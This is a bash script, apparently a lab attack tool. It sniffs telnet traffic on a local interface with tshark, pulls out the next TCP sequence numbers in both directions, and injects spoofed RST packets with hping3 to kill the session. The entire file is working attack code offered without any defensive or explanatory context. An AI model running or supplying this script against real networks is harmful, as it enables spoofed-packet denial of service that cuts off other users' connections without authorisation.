#!/bin/bash

IFACE="enp0s3"
PORT=23
PCAP="/tmp/telnet_kill.pcap"

echo "[*] Capturing telnet traffic..."
sudo timeout 60 tshark -i "$IFACE" \
  -o tcp.relative_sequence_numbers:FALSE \
  -f "tcp port $PORT" \
  -w "$PCAP"

echo "[*] Waiting for silence..."
sleep 30

echo "[*] Extracting last packets per direction..."

# Client → Server
read C_SRC C_DST C_SPORT C_DPORT C_SEQ C_LEN <<< \
$(tshark -r "$PCAP" \
  -Y "tcp.len>=0 && tcp.dstport==$PORT" \
  -T fields \
  -e ip.src -e ip.dst \
  -e tcp.srcport -e tcp.dstport \
  -e tcp.seq_raw -e tcp.len \
  | tail -n 1)

# Server → Client
read S_SRC S_DST S_SPORT S_DPORT S_SEQ S_LEN <<< \
$(tshark -r "$PCAP" \
  -Y "tcp.len>=0 && tcp.srcport==$PORT" \
  -T fields \
  -e ip.src -e ip.dst \
  -e tcp.srcport -e tcp.dstport \
  -e tcp.seq_raw -e tcp.len \
  | tail -n 1)

C_NEXT=$((C_SEQ + C_LEN))
S_NEXT=$((S_SEQ + S_LEN))

echo "[+] Client → Server NEXT SEQ: $C_NEXT"
echo "[+] Server → Client NEXT SEQ: $S_NEXT"

echo "[*] Injecting RSTs..."

# Client → Server
sudo hping3 "$C_DST" -a "$C_SRC" \
  -s "$C_SPORT" -p "$C_DPORT" \
  -R -A -M "$C_NEXT" \
  -c 3

# Server → Client
sudo hping3 "$S_DST" -a "$S_SRC" \
  -s "$S_SPORT" -p "$S_DPORT" \
  -R -A -M "$S_NEXT" \
  -c 3

echo "[✔] Telnet should be dead."
